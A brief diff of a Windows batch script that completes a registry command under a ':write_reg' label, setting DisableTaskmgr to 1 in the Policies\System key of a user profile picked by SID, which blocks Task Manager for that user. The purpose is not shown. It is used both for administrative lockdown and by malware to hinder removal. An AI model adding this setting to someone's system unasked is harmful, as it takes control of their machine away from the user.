@@ -347,7 +347,7 @@ echo:
 	:write_reg
 	echo %sid_var%
 
-	REG.EXE ADD HKEY_USERS\%sid_var%\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+	REG.EXE ADD HKEY_USERS\%sid_var%\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System	/v DisableTaskmgr /t REG_DWORD /d 1 /f
 
 	GOTO end
 
